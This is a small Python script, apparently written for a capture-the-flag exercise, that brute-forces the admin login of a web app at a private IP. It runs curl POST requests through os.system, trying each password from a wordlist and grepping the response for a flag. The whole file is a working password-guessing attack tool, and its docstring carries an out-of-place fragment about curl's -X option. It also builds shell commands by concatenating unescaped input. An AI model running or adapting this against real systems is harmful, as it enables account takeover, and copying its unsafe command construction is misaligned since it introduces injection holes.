import os

class BruteForce():
    '''
        Class created to run 10000 different passwords against the admin username on app
        Note: When combined with -X, --request, this option can be used to send a command instead, 
        so the user may use the email's unique identifier to make the request.
    '''
    def __init__(self, file_path):
        self.file_path = file_path

    def open_ressources(self):
        return [item.replace("\n", "") for item in open(self.file_path).readlines()]

    def run_brute_force_attack(self):
        self.passwords = self.open_ressources()
        for password in self.passwords:
            curl_command = "curl -X POST \"http://10.203.68.35/index.php?page=signin&username=admin&password=" + password + "&Login=Login\" | grep 'The flag is'"
            os.system(curl_command)
            print("Tested:" + password)


Brute = BruteForce('./passwords.txt')
Brute.run_brute_force_attack()